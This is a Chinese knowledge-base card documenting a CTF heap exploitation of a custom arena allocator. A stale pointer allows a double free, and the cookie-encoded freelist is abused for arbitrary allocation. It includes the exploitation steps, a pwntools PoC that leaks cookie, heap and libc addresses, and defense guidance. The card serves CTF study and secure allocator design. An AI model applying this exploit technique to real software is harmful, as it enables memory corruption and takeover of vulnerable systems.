---
id: binary-pwn-heap-custom-arena-double-free-cookie-arbitrary-alloc
title: 自定义 arena 的 double free 到任意地址分配：cookie 编码 freelist 与 stale 指针
type: scenario
domain: binary
path: binary/pwn/heap
technique: custom-arena-double-free-cookie-arbitrary-alloc
tags:
- pwn
- heap
- double-free
- custom-allocator
- arena
- freelist
- cookie
- arbitrary-write
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V92
  verified_at: '2026-11-05T19:43:13+08:00'
  notes: 已对照原文与图01/02核对：arena magic、/dev/random cookie、bump区0x4000、freelist编码real_ptr=ptr_high32_mask^encoded^cookie、delete清size不清指针、exp中enc_old/0xdeadbeef/anon_base-0x40A4/libc 0x203961等均一致；图02显示成功打印flag{##REDIRECT##}。偏移与PoC为该CTF题特定值，未在本环境复跑；无组件影响版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-custom-arena-double-free-cookie-arbitrary-alloc/
draft: false
kb_aliases:
- 自定义 arena 利用
- 自定义 main_arena
- double free 任意分配
- freelist cookie 编码
- stale chunk 指针
- broken_manager
- 2026 CISCIN 半决赛 pwn
---

## 一句话结论

题目实现了一个自定义 arena 分配器，freelist 指针用 `ptr_cookie` 与高 32 位掩码编码，但 `delete` 只把 size 清零、没有清空 `g_chunks[idx]` 指针，二次 `delete` 即可 double free；由于自定义分配器没有 glibc 的 tcache/fastbin 双重释放检查，攻击者可以通过改写 freelist 的低 32 位，让下一次分配返回任意目标地址，再借助 SIGSEGV 处理器泄露 cookie 与 anon_base，最终实现任意地址读写。

## 原理

- **自定义 arena 结构**：arena 有 magic `0xAACCBBDD0077EECC`、从 `/dev/random` 读取的 4 字节 `ptr_cookie`、`bump_cursor`、`remaining_bytes`、`free_bins[]` 等字段；多个 arena 通过 `next/prev` 挂到全局 root arena 的双向链表上。
- **bump 分配**：初始化时 mmap 0x20000 作为 arena 区域，`g_arena_region_cursor` 从 `base+0x4000` 开始，每次 `arena_create_and_init` 从预留区切 0x4000（`g_arena_region_cursor < g_arena_region_limit`），否则再 `mmap(0,0x4000,PROT_READ|WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0)`。
- **freelist 编码**：释放的小块（`len <= 0x20`）进入 `free_bins[len]`，写入的值是 `user_ptr ^ ptr_cookie`，且只保留低 32 位；分配时用 `real_ptr = ptr_high32_mask ^ encoded_low32 ^ ptr_cookie` 还原，其中 `ptr_high32_mask = bump_cursor & 0xFFFFFFFF00000000`。也就是说高 32 位由 region 基址决定，低 32 位由 cookie 异或保护。
- **分配顺序**：先看当前 arena 的 freelist，再看 root arena 的 freelist；都没有且当前 arena 剩余空间不足时，把剩余空间按 `remaining_bytes >> 5` 挂到 root freelist，再新建 arena；否则从 bump 区切一块。大块走独立 mmap，并把 size 写在用户指针前 4 字节。
- **双重释放根因**：`menu_delete_chunk` 调用 `arena_free` 后只执行 `g_chunk_sizes[idx] = 0`，没有把 `g_chunks[idx]` 置 NULL；再次对同一 index 执行 delete，`arena_free` 会拿同一个 `user_ptr` 再压一次 freelist，形成 double free。自定义分配器没有 tcache key、fastbin top 检查或“是否已释放”校验。
- **从 double free 到任意分配**：经典的 `add(0) → delete(0) → add(1) → delete(0) → edit(1, target_encoded)` 序列：第二次 delete 让 chunk A 同时出现在 index 0 的悬垂指针和 freelist 中；`edit(1)` 改写 A 的前 4 字节（即 freelist 的 next 低 32 位）；下一次 `add(2)` 取出 A 并把 A 的第一个 4 字节当作新的 freelist 头，于是再下一次 `add` 会返回攻击者写入的目标地址。
- **cookie 泄露**：程序安装 SIGSEGV 处理器，崩溃时打印 `si_addr`（`Invalid ptr access: 0x...`）。如果把 freed chunk 的 next 伪造成 `0xdeadbeef`，下一次分配得到的指针低 32 位就是 `0xdeadbeef ^ cookie`；触发写入崩溃后，`si_addr & 0xffffffff ^ 0xdeadbeef` 即可还原旧 cookie。
- **重启后的新 cookie**：处理器会 `memset` 全局 arena/chunks/sizes 并递归调用 `main` 重启，但旧的 arena 内存区域和 altstack 仍在。利用旧 cookie 解出旧 chunk0 的低 32 位，再在新一轮 double free 中泄露新编码值，结合 `old_chunk0_low32 + 0x4000` 可算出新 cookie；旧 chunk0 的完整地址减去固定偏移（本案例 0x40A4）得到 `anon_base`。
- **libc 泄露与任意写**：用新 cookie 编码目标地址 `build(target) = (target & 0xffffffff) ^ new_cookie`，通过 double free 让分配返回 `anon_base+0x36e0` 等位置，读出 libc 指针（案例偏移 0x203961），之后就能把任意值写到任意地址（用于伪造 ucontext，见关联卡）。

## 触发条件

- 目标程序使用自定义 arena/分配器，且 delete 路径存在“清 size 不清指针”的 stale pointer；
- 分配器没有 double free 检查，或检查可被绕过；
- 程序提供 add/edit/show/delete 等菜单，能对已释放 chunk 继续 edit；
- 程序有可观测的崩溃信息（如 SIGSEGV handler 打印 `si_addr`）或可重启逻辑，便于泄露 cookie/基址；
- 已获得题目二进制与 libc（CTF 场景）或有对应漏洞利用环境。

## 利用步骤

1. 审计分配器：确认 size 编码、freelist 编码公式、arena 链表与 bump 区布局。
2. 用 `add(5,0x100)`、`delete(5)`、`delete(5)`、`show(5)` 读出编码后的 freelist 值 `enc_old`（注意第一次 free 会往 chunk 头写 0，可能需要多次 free 或构造非零 next 绕过 00 截断）。
3. 用 `add(0,0x200) → delete(0) → add(1,0x200) → delete(0) → edit(1, p32(0xdeadbeef))` 污染 freelist；下一次 `add(2)` 返回伪造指针，再 `add(3)` 触发对该指针的写入崩溃。
4. 从 SIGSEGV handler 打印的 `Invalid ptr access` 取 `fault_ptr`，计算 `old_cookie = (fault_ptr & 0xffffffff) ^ 0xdeadbeef`。
5. 程序重启后重复 double free，读取新的编码值 `enc_new`，计算 `old_chunk0_low32 = enc_old ^ old_cookie`、`new_chunk0_low32 = (old_chunk0_low32 + 0x4000) & 0xffffffff`、`new_cookie = enc_new ^ new_chunk0_low32`。
6. 计算 `old_chunk0 = (fault_ptr & 0xffffffff00000000) | old_chunk0_low32`、`anon_base = old_chunk0 - 0x40A4`。
7. 用 `build(target) = (target & 0xffffffff) ^ new_cookie` 构造 freelist next，double free 后让分配返回 `anon_base+0x36e0` 等目标，读出 libc 指针并计算 libc base。
8. 继续用同一任意分配原语写任意地址，为 ucontext 劫持准备 RDI/RSP/RIP（见关联卡）。

## PoC

以下为按题解压缩的关键步骤（完整 exp 依赖题目二进制与 libc 偏移），仅作 CTF/防御研究：

```python
from pwn import *
context.arch = 'amd64'

def add(i, sz, data): ...
def delete(i): ...
def show(i): ...
def edit(i, data): ...

# 1) 泄露旧 encoded 值
add(5, 0x100, b'a'); delete(5); delete(5); show(5)
enc_old = u32(io.recv(4))

# 2) 污染 freelist，制造非法指针并触发 SIGSEGV
add(0, 0x200, b'a' * 0x200); delete(0)
add(1, 0x200, b'b' * 0x200); delete(0)
edit(1, p32(0xdeadbeef))
add(2, 0x200, b'c' * 0x200)
add(3, 0x200, b'd' * 0x200)          # 写 0xdeadbeef... 崩溃

fault_ptr = int(io.recvuntil(b'\n').split(b'0x')[1], 16)
old_cookie = (fault_ptr & 0xffffffff) ^ 0xdeadbeef

# 3) 重启后计算新 cookie 与 anon_base
add(0, 8, b'C' * 8); delete(0); delete(0); show(0)
enc_new = u32(io.recv(4))
old_chunk0_low32 = enc_old ^ old_cookie
new_chunk0_low32 = (old_chunk0_low32 + 0x4000) & 0xffffffff
new_cookie = enc_new ^ new_chunk0_low32
old_chunk0 = (fault_ptr & 0xffffffff00000000) | old_chunk0_low32
anon_base = old_chunk0 - 0x40A4

def build(target):
    return (target & 0xffffffff) ^ new_cookie

# 4) 任意分配读 libc
add(2, 8, b'a'); delete(2)
add(3, 8, b'a'); delete(2)
edit(3, p32(build(anon_base + 0x36e0)))
add(4, 8, b'a'); add(5, 8, b'a')
show(5)
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x203961
```

## 变体与关联

- 变体：freelist 编码可换成 `ptr ^ cookie`、`ptr >> 4`、safe-linking 风格的自定义异或；核心都是“可控的低位/next 指针 + 无重复释放检查”。
- 变体：如果没有 SIGSEGV handler，可通过 show 泄漏、格式串、UAF 读或 arena 元数据泄露获得 cookie/基址。
- 变体：本卡聚焦任意分配原语；后续劫持控制流可用 ucontext/sigreturn（见关联卡）、GOT/函数指针覆写、`__free_hook`/`__malloc_hook`（旧 glibc）或栈迁移。
- 关联：[[binary-pwn-stack-sigaltstack-ucontext-sigreturn-hijack]]（本案例的最终控制流劫持）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（堆 UAF 泄 libc）、[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 编码）。

## 检测与防御

- **CTF/代码审计**：delete 后必须把 `g_chunks[idx]` 置 NULL 并清空 size；分配器应维护 allocated/free 状态或使用 tcache key 类机制检测 double free；freelist 指针编码不能只保护低 32 位而把高 32 位交给可预测的 region 基址。
- **防御性编码**：用随机 cookie + 完整 64 位异或/乘法哈希保护 freelist；对 freelist 头做范围校验（必须落在 arena region 内）；对 size 字段做完整性校验。
- **运行时检测**：CTF 环境可开 ASAN/glibc malloc 检查；生产代码避免自研分配器，使用经过审计的 allocator；对 SIGSEGV handler 的 `si_addr` 打印做信息最小化（不要向用户泄露完整地址）。
- **利用面**：即使有 cookie，崩溃信息 + 重启逻辑也可能泄露足够信息；安全设计上应避免“崩溃后重启并保留旧堆状态”。
